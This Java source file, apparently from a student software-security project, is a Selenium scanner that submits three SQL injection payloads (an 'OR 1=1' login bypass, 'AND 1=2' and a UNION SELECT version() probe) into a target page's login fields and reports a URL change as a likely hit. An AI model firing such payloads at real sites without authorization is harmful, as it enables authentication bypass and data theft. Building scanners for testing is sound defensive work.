package fr.isep.projetseculogiciel;

import io.github.bonigarcia.wdm.WebDriverManager;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

import java.util.Arrays;
import java.util.List;

public class SQLInjectionController {
    private static final List<String> SQL_INJECTION_PAYLOADS = Arrays.asList(
            "' OR '1'='1'; --",
            "' AND 1=2",
            "' UNION SELECT 1, version() limit 1,1"
    );

    public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println("Usage: java SqlInjectionScanner <URL>");
            return;
        }
        String url = args[0];
        WebDriverManager.chromedriver().setup();
        WebDriver driver = new ChromeDriver(); // Initialize WebDriver here

        try {
            driver.get(url);
            List<WebElement> loginInputs = driver.findElements(By.cssSelector("input[name=login], input[type=text], input[type=password]"));
            for (WebElement input : loginInputs) {
                String inputName = input.getAttribute("name");
                System.out.println("Potential input field for testing: " + inputName);
                testForSqlInjection(driver, url, inputName);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            driver.quit();
        }
    }

    private static void testForSqlInjection(WebDriver driver, String baseUrl, String inputName) {
        try {
            for (String payload : SQL_INJECTION_PAYLOADS) {
                driver.get(baseUrl);

                // Fill the 'email' input with 'admin' concatenated with the payload
                WebElement emailInput = driver.findElement(By.id("email"));
                emailInput.clear();
                emailInput.sendKeys("admin" + payload);

                // Store the original URL before submitting the form
                String originalUrl = driver.getCurrentUrl();

                // Locate and fill the target input field (if necessary)
                WebElement inputField = driver.findElement(By.name(inputName));
                inputField.clear();
                inputField.sendKeys(payload);

                // Click the submit button
                driver.findElement(By.cssSelector("button[type='submit']")).click();

                // Wait for the page to load after submission
                Thread.sleep(5000); // Wait for 5 seconds

                // Check if the URL has changed
                String newUrl = driver.getCurrentUrl();
                if (!newUrl.equals(originalUrl)) {
                    System.out.println("Potential SQL injection detected for payload: " + payload);
                } else {
                    System.out.println("No change in URL for payload: " + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



}
